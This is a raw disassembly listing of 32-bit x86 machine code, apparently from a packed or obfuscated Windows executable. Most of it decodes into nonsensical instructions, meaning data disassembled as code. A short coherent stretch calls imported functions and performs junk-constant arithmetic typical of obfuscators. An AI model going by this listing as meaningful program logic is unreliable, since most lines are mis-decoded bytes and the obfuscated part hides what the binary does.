  41743d:	lock scas eax,DWORD PTR es:[edi]
  41743f:	pusha  
  417440:	mov    BYTE PTR [edx+ecx*8+0x12],bl
  417444:	ret    0xc162
  417447:	xchg   ebx,eax
  417448:	jo     0x417499
  41744a:	xchg   BYTE PTR [ebp+edi*2+0x72ebe053],ah
  417451:	push   ss
  417452:	adc    al,0xf3
  417454:	fiadd  WORD PTR [eax]
  417456:	inc    esp
  417457:	call   0x7d51757
  41745c:	lea    eax,[ecx-0x39]
  41745f:	xor    eax,0xee94a076
  417464:	retf   
  417465:	scas   al,BYTE PTR es:[edi]
  417466:	std    
  417467:	ss dec ebx
  417469:	outs   dx,DWORD PTR fs:[esi]
  41746b:	push   ebp
  41746c:	cmp    bh,BYTE PTR [ebp+eiz*2+0x5dee46b8]
  417473:	mov    ch,0x9a
  417475:	cmp    al,0x2b
  417477:	ror    edi,0xa
  41747a:	mov    esp,0xcd8899d4
  41747f:	dec    ecx
  417480:	stos   BYTE PTR es:[edi],al
  417481:	jmp    0x951d0c1e
  417486:	lds    ecx,FWORD PTR [edx]
  417488:	and    edi,DWORD PTR [edi]
  41748a:	and    al,0xa3
  41748c:	ret    0x700f
  41748f:	lods   eax,DWORD PTR ds:[esi]
  417490:	stos   BYTE PTR es:[edi],al
  417491:	popf   
  417492:	aaa    
  417493:	jmp    0x3827:0xa175e7b1
  41749a:	lea    esp,[eax-0xe]
  41749d:	call   0x77411bf2
  4174a2:	jb     0x4174ae
  4174a4:	popa   
  4174a5:	cwde   
  4174a6:	sub    bl,cl
  4174a8:	pop    edi
  4174a9:	pop    edx
  4174aa:	push   esp
  4174ab:	jp     0x4174e8
  4174ad:	mov    eax,ds:0x7d5b8009
  4174b2:	xchg   esi,eax
  4174b3:	mov    al,ds:0x41221e09
  4174b8:	fmul   DWORD PTR [esi]
  4174ba:	and    al,0xf2
  4174bc:	sbb    DWORD PTR [ebx+0x5a],eax
  4174bf:	xor    eax,ecx
  4174c1:	sub    edx,eax
  4174c3:	cmp    edi,edx
  4174c5:	jbe    0x4170cf
  4174cb:	pop    edi
  4174cc:	pop    esi
  4174cd:	pop    ebx
  4174ce:	leave  
  4174cf:	ret    0x8
  4174d2:	push   ebp
  4174d3:	mov    ebp,esp
  4174d5:	and    esp,0xfffffff8
  4174d8:	sub    esp,0x9c
  4174de:	push   ebx
  4174df:	push   esi
  4174e0:	push   edi
  4174e1:	push   DWORD PTR ds:0x422404
  4174e7:	lea    eax,[esp+0xa4]
  4174ee:	push   eax
  4174ef:	call   DWORD PTR ds:0x428ea0
  4174f5:	push   DWORD PTR [esp+0xa4]
  4174fc:	push   DWORD PTR ds:0x4223f0
  417502:	call   DWORD PTR ds:0x428ec4
  417508:	push   eax
  417509:	call   DWORD PTR ds:0x428eac
  41750f:	mov    ecx,DWORD PTR ds:0x4227b8
  417515:	sub    DWORD PTR ds:0x42833f,0x4283bb
  41751f:	jmp    0x4178ee
  417524:	iret   
  417525:	and    ah,BYTE PTR [esi]
  417527:	inc    eax
  417528:	sbb    bh,BYTE PTR [edi+ebp*4]
  41752b:	and    cl,BYTE PTR [ecx+edx*8]
  41752e:	fnstcw WORD PTR [esp+eax*1+0xab07fa2]
  417535:	out    0x16,eax
  417537:	sbb    BYTE PTR [edx+edx*1+0x35111818],bh
  41753e:	mov    ecx,0x22881b2f
  417543:	push   ss
  417544:	pop    edi
  417545:	or     DWORD PTR [eax+0x5647cfa5],ebp
  41754b:	jae    0x41752b
  41754d:	(bad)  [ebx+0x74eaace9]
  417553:	inc    esp
  417554:	dec    eax
  417555:	push   es
  417556:	(bad)  
  417557:	pop    es
  417558:	mov    cl,0x7d
  41755a:	xchg   esp,eax
  41755b:	fldcw  WORD PTR [edx+0x25]
  41755e:	sub    al,0x78
  417560:	mov    eax,ds:0xf5c2a02d
  417565:	pop    edx
  417566:	jmp    0x35a2:0x5d4e1ac2
  41756d:	mov    ebx,0xa97124d
  417572:	inc    esp
  417573:	out    0xa1,eax
  417575:	sub    DWORD PTR [ebx+edi*8],ebx
  417578:	adc    al,0xa6
  41757a:	jo     0x4175a7
  41757c:	scas   eax,DWORD PTR es:[edi]
  41757d:	stos   BYTE PTR es:[edi],al
  41757e:	mov    bl,0xd0
  417580:	dec    esi
  417581:	push   ecx
  417582:	add    BYTE PTR [ebx-0x53],cl
  417585:	js     0x417593
  417587:	rcr    dh,0xef
  41758a:	in     al,dx
  41758b:	pop    eax
  41758c:	loop   0x4175c7
  41758e:	out    0x5a,eax
  417590:	sti    
  417591:	ja     0x4175dd
  417593:	jmp    0xe01fe27c
  417598:	stos   DWORD PTR es:[edi],eax
  417599:	mov    cl,0x25
  41759b:	mov    WORD PTR [edx+0x1a],ds
  41759e:	imul   dh
  4175a0:	dec    ebp
  4175a1:	neg    ebx
  4175a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4175a4:	mov    ah,ch
  4175a6:	es repnz out dx,eax
  4175a9:	pop    esi
  4175aa:	cmp    al,0xbc
  4175ac:	push   eax
  4175ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4175ae:	or     DWORD PTR [eax],esp
  4175b0:	and    eax,ecx
  4175b2:	mov    dl,0xd8
  4175b4:	push   0x63e6618d
  4175b9:	adc    BYTE PTR [eax+0x7cb3f908],al
  4175bf:	adc    BYTE PTR [esi+0x5812c856],ah
  4175c5:	inc    edx
  4175c6:	enter  0xcfa2,0xc5
  4175ca:	xchg   edi,eax
  4175cb:	or     al,BYTE PTR [esi]
  4175cd:	push   es
  4175ce:	scas   al,BYTE PTR es:[edi]
  4175cf:	push   cs
  4175d0:	and    BYTE PTR [edx],al
  4175d2:	ins    DWORD PTR es:[edi],dx
  4175d3:	aad    0x8c
  4175d5:	ss ds ds xchg ecx,eax
  4175d9:	and    bh,BYTE PTR [ebp+0x19789c4b]
  4175df:	retf   0x3dff
  4175e2:	mov    eax,ds:0xeecc6337
  4175e7:	push   ebp
  4175e8:	ins    DWORD PTR es:[edi],dx
  4175e9:	je     0x41758b
  4175eb:	jno    0x41763b
  4175ed:	std    
  4175ee:	retf   
  4175ef:	mov    esi,0x45c3c7a1
  4175f4:	add    DWORD PTR [ecx],ecx
  4175f6:	cmp    esp,ebx
  4175f8:	out    0x73,al
  4175fa:	inc    esp
  4175fb:	push   0x45
  4175fd:	push   es
  4175fe:	mov    al,ds:0x27ef7c3e
  417603:	leave  
  417604:	outs   dx,DWORD PTR ds:[esi]
  417605:	cmp    al,0x5f
  417607:	mov    ch,BYTE PTR [eax+0x4cc19f67]
  41760d:	push   edi
  41760e:	shl    DWORD PTR [ebx+0x21],1
  417611:	bound  edi,QWORD PTR [esi+0x6f]
  417614:	dec    eax
  417615:	addr16 (bad) 
  417617:	pop    esi
  417618:	xchg   BYTE PTR [edi+0x75],al
  41761b:	add    dh,ah
  41761d:	(bad)  
  41761e:	dec    edx
  41761f:	mov    WORD PTR [edi+0x72],cs
  417622:	sub    eax,0xcd8ad05e
  417627:	mov    bl,0x3b
  417629:	cmp    BYTE PTR [edi+0x37aaaaef],0xe8
  417630:	mov    DWORD PTR [ecx],0x4f7f74f3
  417636:	ficomp WORD PTR [esi-0x47]
  417639:	push   ebx
  41763a:	sbb    eax,esp
  41763c:	pop    ds
  41763d:	pop    esp
  41763e:	loop   0x41760b
  417640:	mov    ebx,0x67f7ef76
  417645:	sti    
  417646:	nop
  417647:	add    BYTE PTR [ebp+eax*1+0x753088fb],ch
  41764e:	push   esi
  41764f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417650:	or     ecx,edx
  417652:	jb     0x417629
  417654:	std    
  417655:	jge    0x4175fc
  417657:	outs   dx,DWORD PTR ds:[esi]
  417658:	shr    esi,cl
  41765a:	into   
  41765b:	and    ebp,eax
  41765d:	and    DWORD PTR [eax+0x6a],edx
  417660:	sti    
  417661:	mov    cl,0x4b
  417663:	and    ebx,ebp
  417665:	sbb    ah,BYTE PTR [edx]
  417667:	fidiv  DWORD PTR [ecx]
  417669:	jle    0x417658
  41766b:	mov    ebp,0xf13d4539
  417670:	jl     0x417634
  417672:	(bad)  
  417673:	xchg   ecx,eax
  417674:	in     eax,0x82
  417676:	cmp    ecx,DWORD PTR [edi]
  417678:	mov    edx,0x5584ad27
  41767d:	xchg   BYTE PTR [ebx-0x82c535e],al
  417683:	and    dh,BYTE PTR [esp+esi*2-0xdd7e402]
  41768a:	pop    ecx
  41768b:	pusha  
  41768c:	and    al,0x81
  41768e:	retf   0x8248
  417691:	and    al,0x48
  417693:	mov    al,ss:0x4d55b33a
  417699:	cwde   
  41769a:	out    0xdd,al
  41769c:	and    ebx,ebp
  41769e:	sub    al,0xd7
  4176a0:	outs   dx,BYTE PTR ds:[esi]
  4176a1:	imul   eax,DWORD PTR [esi+0x66],0x6a39e347
  4176a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4176a9:	retf   0xde16
  4176ac:	jnp    0x4176f2
  4176ae:	out    0x70,eax
  4176b0:	and    eax,DWORD PTR [edi-0x3]
  4176b3:	pop    ds
  4176b4:	arpl   WORD PTR [edi],sp
  4176b6:	(bad)  
  4176b7:	add    ebx,DWORD PTR [eax]
  4176b9:	push   0x902f0f13
  4176be:	jmp    0xdcaff9cb
  4176c3:	retf   
  4176c4:	(bad)  
  4176c5:	cmp    ch,bl
  4176c7:	call   0x3c8cbf8d
  4176cc:	fs mov dl,0x8e
  4176cf:	xor    eax,0xf00ab0d9
  4176d4:	aad    0x89
  4176d6:	sub    ebp,edi
  4176d8:	pop    ebx
  4176d9:	cmp    ebp,DWORD PTR [edx+ecx*1]
  4176dc:	mov    ds:0xca1aec82,al
  4176e1:	jno    0x417715
  4176e3:	jle    0x417729
  4176e5:	xchg   DWORD PTR [edx-0x102ebca6],ebp
  4176eb:	mov    edx,0xb1a094c2
  4176f0:	xor    al,0x20
  4176f2:	fmulp  st(3),st
  4176f4:	push   es
  4176f5:	push   ecx
  4176f6:	or     al,0x60
  4176f8:	clc    
  4176f9:	pop    ds
  4176fa:	lock cmp DWORD PTR [ebx-0x14],eax
  4176fe:	mov    WORD PTR [ebx-0x12800c50],ds
  417704:	push   es
  417705:	push   0x2e
  417707:	dec    edx
  417708:	sbb    eax,DWORD PTR [ecx*1-0x6c188a11]
  41770f:	leave  
  417710:	jl     0x4176ac
  417712:	push   cs
  417713:	adc    BYTE PTR [ebp+0x21463cf5],0xc6
  41771a:	or     al,0x9f
  41771c:	dec    ebp
  41771d:	cdq    
  41771e:	pop    esi
  41771f:	push   esp
  417720:	ret    
  417721:	rcl    BYTE PTR [esi-0x3dd45fd2],1
  417727:	xchg   esp,eax
  417728:	push   eax
  417729:	call   0x802:0x91d4841a
  417730:	in     al,dx
  417731:	mov    dh,0xd9
  417733:	push   0x4c84ac9b
  417738:	stc    
  417739:	sbb    ch,al
  41773b:	add    ecx,DWORD PTR [eax-0x7842783d]
  417741:	(bad)  
  417742:	gs dec esi
  417744:	cmp    cl,cl
  417746:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417747:	sti    
  417748:	adc    DWORD PTR [ebx],esi
  41774a:	mov    ebx,edx
  41774c:	sti    
  41774d:	call   0x73cd:0x72ff0c54
  417754:	lahf   
  417755:	pop    es
  417756:	adc    BYTE PTR ds:0x69de3fca,dl
  41775c:	lahf   
  41775d:	clc    
  41775e:	mov    WORD PTR [edx-0x5948949a],?
  417764:	sti    
  417765:	add    dh,BYTE PTR ds:0xe476477f
  41776b:	mul    BYTE PTR [ecx-0x7a4f2d00]
  417771:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417772:	xor    dl,BYTE PTR [eax+edi*8+0x30739f24]
  417779:	jmp    0xe73b6844
  41777e:	mov    edx,0xda83d2a7
  417783:	jbe    0x417746
  417785:	add    DWORD PTR [edx-0x4a],ecx
  417788:	mov    eax,ds:0x8e4ad766
  41778d:	xor    DWORD PTR [ecx],esi
  41778f:	adc    BYTE PTR [edx],dl
  417791:	inc    esp
  417792:	mov    ecx,0xaa6d30a1
  417797:	js     0x4177d0
  417799:	cmp    cl,cl
  41779b:	sbb    edx,DWORD PTR [edx-0x3c]
  41779e:	bnd jge 0x4177c9
  4177a1:	adc    ah,0xe5
  4177a4:	xchg   ebp,eax
  4177a5:	xchg   edi,eax
  4177a6:	pusha  
  4177a7:	sbb    eax,0x5bbb51da
  4177ac:	(bad)  
  4177ad:	idiv   BYTE PTR [esi+ebx*1-0x467bad7c]
  4177b4:	mov    eax,0x94900005
  4177b9:	lods   al,BYTE PTR ds:[esi]
  4177ba:	sub    esp,0x5f9abeb4
  4177c0:	dec    edi
  4177c1:	xor    DWORD PTR [esp+ebp*1+0x4c0f578e],ebp
  4177c8:	xor    DWORD PTR [ebx+0x52305a3a],edi
  4177ce:	mov    cl,dh
  4177d0:	cwde   
  4177d1:	(bad)  
  4177d2:	adc    esp,ebp
  4177d4:	xchg   edx,eax
  4177d5:	adc    esi,esi
  4177d7:	sbb    edx,edx
  4177d9:	fbstp  TBYTE PTR [edi+0x67]
  4177dc:	push   ebp
  4177dd:	out    dx,eax
  4177de:	xchg   esi,eax
  4177df:	dec    esi
  4177e0:	or     al,0x83
  4177e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4177e3:	sub    eax,0x9f1e76ed
  4177e8:	(bad)  
  4177e9:	mov    al,ds:0xa236ed5f
  4177ee:	sub    BYTE PTR [ebp+edx*2-0x15db725e],0x9c
  4177f6:	dec    ebx
  4177f7:	xchg   DWORD PTR [edx+edi*1],ebx
  4177fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4177fb:	or     BYTE PTR [edx+eax*1-0x4],cl
  4177ff:	mov    WORD PTR [eax+0x45],ss
  417802:	sbb    DWORD PTR [edx+0x5cdc9066],0x7a
  417809:	stos   BYTE PTR es:[edi],al
  41780a:	xchg   ebp,eax
  41780b:	rol    BYTE PTR [edi+0x7b],1
  41780e:	ror    cl,cl
  417810:	das    
  417811:	cmp    BYTE PTR [edi],ch
  417813:	inc    ebp
  417814:	sub    edx,DWORD PTR [edi]
  417816:	(bad)  
  417818:	mov    cl,0x4e
  41781a:	ret    
  41781b:	push   0x4
  41781d:	iret   
  41781e:	out    0xdf,eax
  417820:	in     ax,0x9f
  417823:	push   ss
  417824:	stos   DWORD PTR es:[edi],eax
  417825:	in     al,0x63
  417827:	out    0x2d,al
  417829:	mov    edx,DWORD PTR [ecx+0x59]
  41782c:	loopne 0x41785f
  41782e:	ds jmp 0x4066:0x110a5b15
  417836:	inc    eax
  417837:	jo     0x41784e
  417839:	pop    ds
  41783a:	sahf   
  41783b:	int3   
  41783c:	and    DWORD PTR [ebx+0x11],eax
  41783f:	aam    0x9a
  417841:	xor    DWORD PTR [edi],esp
  417843:	iret   
  417844:	or     cl,BYTE PTR [esi-0x2b]
  417847:	out    0xc,eax
  417849:	mov    esp,0xd4c83fc3
  41784e:	push   0x55
  417850:	neg    BYTE PTR [edx+ebp*1+0x45]
  417854:	and    eax,0x610651e4
  417859:	ins    DWORD PTR es:[edi],dx
  41785a:	add    ch,BYTE PTR [eax+0x23]
  41785d:	sub    DWORD PTR [ebx-0x40],esi
  417860:	int    0xb6
  417862:	mov    cl,0xa3
  417864:	push   edi
  417865:	fs sbb dl,dl
  417868:	clc    
  417869:	mov    ah,0xae
  41786b:	cdq    
  41786c:	xor    dl,0x4a
  41786f:	cmc    
  417870:	cmp    DWORD PTR [edx],0x79
  417873:	sub    BYTE PTR [edx-0x16f95b2c],al
  417879:	retf   0x589a
  41787c:	mov    esp,0x57e53b37
  417881:	sbb    eax,0x51026e5f
  417886:	fild   DWORD PTR [eax-0x69]
  417889:	cmp    BYTE PTR [ebp+0x7fc10a4b],0x19
  417890:	and    DWORD PTR [ebp+0x77],eax
  417893:	ss xchg edi,eax
  417895:	das    
  417896:	and    eax,0x4f482c0f
  41789b:	and    eax,0xf5a1d304
  4178a0:	adc    BYTE PTR [esp+edi*1],dh
  4178a3:	lods   al,BYTE PTR ds:[esi]
  4178a4:	dec    ecx
  4178a5:	in     al,0x54
  4178a7:	pusha  
  4178a8:	fcomip st,st(5)
  4178aa:	dec    eax
  4178ab:	mov    ah,0x4
  4178ad:	int    0xfe
  4178af:	push   eax
  4178b0:	mov    WORD PTR [edi-0x3eb2bb93],ds
  4178b6:	adc    eax,0x9e600724
  4178bb:	shr    eax,1
  4178bd:	mov    BYTE PTR gs:[eax-0x775a1e26],ah
  4178c4:	or     eax,0x4b8cbf2
  4178c9:	inc    ecx
  4178ca:	fiadd  WORD PTR [esi-0x1e821fbf]
  4178d0:	mov    ebx,0x803683a8
  4178d5:	xor    al,0x12
  4178d7:	dec    esp
  4178d8:	loop   0x41786c
  4178da:	iret   
  4178db:	lds    edx,FWORD PTR [ecx]
  4178dd:	cmp    ebp,DWORD PTR [ebp+0x2f1a4d01]
  4178e3:	pop    edx
  4178e4:	inc    ebx
  4178e5:	div    DWORD PTR [edi-0x329e000c]
  4178eb:	out    dx,eax
  4178ec:	and    ch,BYTE PTR gs:[edx+0x0]
  4178f0:	and    DWORD PTR ds:0x4282d7,0x6fb6
  4178fa:	push   DWORD PTR [ecx]
  4178fc:	or     DWORD PTR ds:0x428277,0x652f
  417906:	call   eax
  417908:	adc    esi,DWORD PTR ds:0x42828f
  41790e:	mov    esi,0x1ff
  417913:	add    eax,eax
  417915:	mov    DWORD PTR [esp+0x24],0x3992
  41791d:	mov    DWORD PTR [esp+0xc],0x79a2
  417925:	add    DWORD PTR ds:0x428277,0x3f4a
  41792f:	mov    eax,DWORD PTR [esp+0xc]
  417933:	mov    ecx,DWORD PTR ds:0x428317
  417939:	mov    ecx,DWORD PTR [ecx]
  41793b:	and    DWORD PTR ds:0x4282df,ecx
  417941:	mov    ecx,DWORD PTR [esp+0x24]
  417945:	sub    DWORD PTR ds:0x42828f,0x428297
  41794f:	xor    eax,0x1d22
  417954:	xor    DWORD PTR ds:0x428353,0x3de5
  41795e:	imul   eax,eax,0xffffdeb4
  417964:	and    eax,0x43eb
  417969:	sub    eax,ecx
  41796b:	xor    DWORD PTR ds:0x4282af,0x4281db
  417975:	mov    DWORD PTR [esp+0x3c],eax
  417979:	xor    DWORD PTR ds:0x42819b,0x24fe
  417983:	mov    DWORD PTR [esp+0x38],0x3b18
  41798b:	mov    DWORD PTR [esp+0x2c],0x6c93
  417993:	adc    DWORD PTR ds:0x42829f,0x3367
  41799d:	mov    DWORD PTR [esp+0x24],0x418e
  4179a5:	add    DWORD PTR ds:0x4282db,ebx
  4179ab:	mov    DWORD PTR [esp+0xc],0x5ac3
  4179b3:	xor    ecx,ecx
  4179b5:	add    ecx,DWORD PTR ds:0x4283e7
  4179bb:	add    DWORD PTR ds:0x4281ab,ecx
  4179c1:	mov    eax,DWORD PTR [esp+0xc]
  4179c5:	mov    ecx,DWORD PTR [esp+0x24]
  4179c9:	add    DWORD PTR ds:0x4282d3,0x705
  4179d3:	sub    ecx,eax
  4179d5:	and    eax,0x1ffb
  4179da:	mov    eax,DWORD PTR [esp+0x2c]
  4179de:	and    ecx,eax
  4179e0:	mov    eax,DWORD PTR [esp+0x38]
  4179e4:	sbb    DWORD PTR ds:0x428193,0x4283af
  4179ee:	xor    ecx,0x10d6
  4179f4:	sub    ecx,0x782c
  4179fa:	imul   ecx,eax
  4179fd:	mov    eax,0x7fd0
  417a02:	mov    eax,DWORD PTR [esp+0x3c]
  417a06:	cmp    eax,ecx
  417a08:	mov    DWORD PTR ds:0x4281ab,0x7353
  417a12:	jne    0x41890f
  417a18:	and    eax,eax
  417a1a:	mov    DWORD PTR [esp+0x10],0x1
  417a22:	mov    DWORD PTR [esp+0x30],0x2f16
  417a2a:	xor    ecx,DWORD PTR ds:0x428297
  417a30:	mov    DWORD PTR [esp+0x48],0x16f
  417a38:	mov    DWORD PTR [esp+0x50],0x30c5
  417a40:	add    DWORD PTR ds:0x428337,edx
  417a46:	push   DWORD PTR ds:0xe5bfd6f1
  417a4c:	cmp    DWORD PTR ds:0x4282b3,0x0
  417a53:	mov    DWORD PTR ds:0x42832f,edx
  417a59:	mov    ecx,0x328
  417a5e:	mov    ecx,0x6d04
  417a63:	jmp    0x417abd
  417a68:	mov    DWORD PTR ds:0x4282a7,0x44f5
  417a72:	cmp    DWORD PTR ds:0x4282b3,0x0
  417a79:	je     0x417a9d
  417a7f:	push   DWORD PTR [ebp-0x18]
  417a82:	push   DWORD PTR [ebp-0x18]
  417a85:	push   0x8f00
  417a8a:	push   DWORD PTR [ebp-0x10]
  417a8d:	call   DWORD PTR ds:0x428e24
  417a93:	not    ecx
  417a95:	sub    ecx,ecx
  417a97:	or     DWORD PTR ds:0x428287,ebx
  417a9d:	mov    ecx,DWORD PTR ds:0x428313
  417aa3:	mov    ecx,DWORD PTR [ecx]
  417aa5:	and    DWORD PTR ds:0x4281cb,ecx
  417aab:	sbb    ecx,0x5390
  417ab1:	add    ecx,0xb3f
  417ab7:	add    DWORD PTR ds:0x4281db,edi
  417abd:	mov    DWORD PTR [esp+0x8c],0x4ebc
  417ac8:	xor    eax,eax
  417aca:	mov    DWORD PTR [esp+0x98],0x76
  417ad5:	mov    DWORD PTR [esp+0x40],0x556d
  417add:	neg    DWORD PTR ds:0x42819f
  417ae3:	jmp    0x417eb2
  417ae8:	(bad)  [eax-0x2]
  417aec:	xor    BYTE PTR [edx+0x1a],bh
  417aef:	fwait
  417af0:	clc    
  417af1:	dec    edi
  417af2:	arpl   WORD PTR [eax+ebp*2-0x51551c0e],di
  417af9:	loope  0x417b11
  417afb:	sbb    BYTE PTR [edx+edx*1+0x76801818],bh
  417b02:	inc    ebp
  417b03:	sub    DWORD PTR [eax+0x5a],esp
  417b06:	xchg   edx,eax
  417b07:	push   cs
  417b08:	int    0x9d
  417b0a:	clc    
  417b0b:	retf   
  417b0c:	add    al,0x1b
  417b0e:	xor    dh,BYTE PTR [esi+0x18372f4f]
  417b14:	push   esi
  417b15:	lods   eax,DWORD PTR ds:[esi]
  417b16:	out    0xae,al
  417b18:	jle    0x417b6b
  417b1a:	outs   dx,DWORD PTR ds:[esi]
  417b1b:	cmp    DWORD PTR [esi-0x72],edi
  417b1e:	dec    esi
  417b1f:	(bad)  
  417b20:	outs   dx,DWORD PTR ds:[esi]
  417b21:	(bad)  
  417b22:	and    BYTE PTR ds:0x49a55dd,bh
  417b28:	or     eax,0x673755e5
  417b2d:	outs   dx,BYTE PTR ds:[esi]
  417b2e:	js     0x417b45
  417b30:	cmc    
  417b31:	push   esp
  417b32:	cmp    eax,DWORD PTR [esi]
  417b34:	loope  0x417ae9
  417b36:	inc    ecx
  417b37:	mov    al,ds:0xf2ad120e
  417b3c:	(bad)  
  417b3d:	retf   
  417b3e:	nop
  417b3f:	push   edi
  417b40:	and    esp,DWORD PTR [edx+eax*8-0x4f]
  417b44:	les    ebp,FWORD PTR [eax-0x5a]
  417b47:	outs   dx,DWORD PTR ds:[esi]
  417b48:	ret    
  417b49:	sub    DWORD PTR [esi-0x768d9bf],0xffffffa2
  417b50:	loop   0x417b73
  417b52:	mov    bh,0x81
  417b54:	dec    ebx
  417b55:	adc    BYTE PTR [edx+eax*8],bl
  417b58:	add    al,0x34
  417b5a:	ficomp DWORD PTR [ebx-0x8]
  417b5d:	ins    BYTE PTR es:[edi],dx
  417b5e:	stos   BYTE PTR es:[edi],al
  417b5f:	adc    esi,DWORD PTR [edi+0x13]
  417b62:	dec    edi
  417b63:	test   BYTE PTR [eax],dl
  417b65:	or     eax,0x8ae2c99
  417b6a:	sbb    eax,0xb566cf9a
  417b6f:	(bad)  
  417b70:	outs   dx,BYTE PTR ds:[esi]
  417b71:	clc    
  417b72:	pop    eax
  417b73:	bound  edx,QWORD PTR [ecx-0x6f6bd29]
  417b79:	push   ds
  417b7a:	and    ch,BYTE PTR [edi-0x77]
  417b7d:	cmp    DWORD PTR [ecx-0x4d08ee6],0xfd265c4f
  417b87:	fsub   DWORD PTR [esi+0x7ca9691f]
  417b8d:	sbb    eax,0x82e38c30
  417b92:	aad    0x26
  417b94:	or     eax,0xf647f3c3
  417b9a:	pop    esi
  417b9b:	push   edx
  417b9c:	mov    cl,BYTE PTR [ecx+eiz*8]
  417b9f:	or     esi,DWORD PTR [esi+0x2571d8ad]
  417ba5:	xchg   esi,eax
  417ba6:	lds    ecx,FWORD PTR [ebx+0x511e898a]
  417bac:	retf   0xf61a
  417baf:	shr    BYTE PTR [edx],cl
  417bb1:	jo     0x417c27
  417bb3:	jle    0x417c1c
  417bb5:	sub    ebx,DWORD PTR [ecx]
  417bb7:	dec    esi
  417bb8:	sbb    eax,ecx
  417bba:	nop
  417bbb:	mov    ebp,0x59f8b483
  417bc0:	test   BYTE PTR [ebx],al
  417bc2:	xor    BYTE PTR [ecx+0x7a],dl
  417bc5:	jge    0x417b4f
  417bc7:	pop    edx
  417bc8:	pop    ss
  417bc9:	(bad)
  417bcc:	das    
  417bcd:	cmp    eax,0x8c37fdc0
  417bd2:	push   es
  417bd3:	adc    ah,BYTE PTR [ebp+0xd]
  417bd6:	sub    al,0x28
  417bd8:	dec    esp
  417bd9:	push   eax
  417bda:	test   eax,0x4a8b3ee3
  417bdf:	cmp    ch,BYTE PTR [esi+0x5d16b7d6]
  417be5:	cmp    bl,BYTE PTR [edi-0x6f]
  417be8:	outs   dx,DWORD PTR ds:[esi]
  417be9:	fdiv   DWORD PTR [esi-0x7ee25fc0]
  417bef:	mov    bh,0x69
  417bf1:	mov    esp,0x7fc0ab72
  417bf6:	push   edx
  417bf7:	into   
  417bf8:	test   al,0xda
  417bfa:	in     al,dx
  417bfb:	in     al,dx
  417bfc:	jl     0x417bb5
  417bfe:	or     ah,BYTE PTR [eax-0x50077cb9]
  417c04:	push   edx
  417c05:	and    dl,bh
  417c07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c08:	mov    eax,0x7f4c8ea0
  417c0d:	gs daa 
  417c0f:	jge    0x417c0b
  417c11:	outs   dx,BYTE PTR ds:[esi]
  417c12:	dec    edx
  417c13:	arpl   bx,sp
  417c15:	mov    esi,0xd24b10bf
  417c1a:	les    eax,FWORD PTR [eax]
  417c1c:	mov    al,ds:0xcbd44854
  417c21:	das    
  417c22:	sbb    edx,DWORD PTR [eax+0x5d]
  417c25:	test   al,0xcb
  417c27:	fs and al,0xf1
  417c2a:	leave  
  417c2b:	dec    edi
  417c2c:	scas   al,BYTE PTR es:[edi]
  417c2d:	loope  0x417c52
  417c2f:	xor    DWORD PTR [eax+eiz*8],ebp
  417c32:	clc    
  417c33:	or     ax,0x335
  417c37:	cdq    
  417c38:	and    eax,0xfd178b9
  417c3d:	push   0x11
  417c3f:	pop    edx
  417c40:	or     DWORD PTR [ebp+0x32],ebp
  417c43:	add    edi,edx
  417c45:	lods   al,BYTE PTR ds:[esi]
  417c46:	jbe    0x417c17
  417c48:	and    BYTE PTR [eax+0x4044788f],ch
  417c4e:	jae    0x417c2e
  417c50:	ds mov ecx,?
  417c53:	inc    ebp
  417c54:	pusha  
  417c55:	lods   eax,DWORD PTR ds:[esi]
  417c56:	mov    eax,gs
  417c58:	psrlw  mm7,QWORD PTR [ebx+0x461deabd]
  417c5f:	xchg   edx,eax
  417c60:	sub    edx,DWORD PTR [edi+0x37]
  417c63:	les    ebx,FWORD PTR [eax]
  417c65:	dec    edi
  417c66:	shr    edx,1
  417c68:	push   esp
  417c69:	or     DWORD PTR [esi],0x5f29500e
  417c6f:	sub    eax,ebp
  417c71:	mov    ecx,DWORD PTR [ebx-0x24c05a4f]
  417c77:	mov    ebx,0x976d9b6f
  417c7c:	ret    0xc56e
  417c7f:	aas    
  417c80:	xchg   DWORD PTR [edx+0x1f],ecx
  417c83:	adc    eax,0x42b5585a
  417c88:	jle    0x417c3a
  417c8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417c8b:	outs   dx,DWORD PTR ds:[si]
  417c8d:	cdq    
  417c8e:	and    DWORD PTR [ebx],esi
  417c90:	les    ecx,FWORD PTR ds:0x559c3e00
  417c96:	(bad)  
  417c97:	(bad)  
  417c98:	sar    eax,1
  417c9a:	cmp    dl,BYTE PTR es:[ecx]
  417c9d:	jb     0x417c90
  417c9f:	sub    DWORD PTR [ebp-0x72],0xffffffd2
  417ca3:	imul   ebp,edx,0x1f4e7a31
  417ca9:	div    DWORD PTR [esi+edi*2+0x67]
  417cad:	les    eax,FWORD PTR [ebx]
  417caf:	push   0xf0c8a5c
  417cb4:	es and al,0xd2
  417cb7:	rcl    DWORD PTR [ecx],1
  417cb9:	inc    ebx
  417cba:	xor    bh,BYTE PTR [edx]
  417cbc:	test   DWORD PTR [esi+0x7f],ebp
  417cbf:	ss mov cl,0x4d
  417cc2:	add    ebx,esp
  417cc4:	in     al,dx
  417cc5:	dec    esi
  417cc6:	jns    0x417ccc
  417cc8:	jp     0x417ca2
  417cca:	mov    ebp,0xf9fac5a3
  417ccf:	jp     0x417cf1
  417cd1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417cd2:	in     eax,dx
  417cd3:	lds    edi,FWORD PTR [edx+0x16e78650]
  417cd9:	clc    
  417cda:	or     al,0x1b
  417cdc:	jbe    0x417d26
  417cde:	pop    edx
  417cdf:	xchg   edx,eax
  417ce0:	cmp    BYTE PTR ds:0x7a2ae801,cl
  417ce6:	jbe    0x417c77
  417ce8:	test   BYTE PTR [ebx+0x13],dh
  417ceb:	dec    esi
  417cec:	push   ecx
  417ced:	clc    
  417cee:	pop    ds
  417cef:	(bad)  
  417cf0:	jp     0x417ce2
  417cf2:	mov    ah,0x46
  417cf4:	cld    
  417cf5:	imul   esi,DWORD PTR [edi-0xe4f0d74],0xffffffbe
  417cfc:	push   ebx
